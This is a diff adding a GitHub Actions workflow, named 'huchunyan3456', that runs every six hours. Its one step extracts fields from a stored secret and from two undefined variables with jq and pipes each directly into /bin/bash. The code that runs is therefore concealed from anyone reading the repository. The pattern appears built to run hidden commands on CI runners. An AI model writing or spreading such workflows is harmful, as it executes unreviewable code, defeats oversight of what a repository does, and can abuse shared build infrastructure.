@@ -1,0 +1,20 @@
+name: huchunyan3456
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huchunyan3456
+        env:
+          s38: ${{ secrets.s38 }}
+        run: |
+          echo $s38 | jq -r .erv0 | /bin/bash
+          echo $bssh2719 | jq -r .epoj36314 | /bin/bash
+          echo $nm4107 | jq -r .j0 | /bin/bash
+
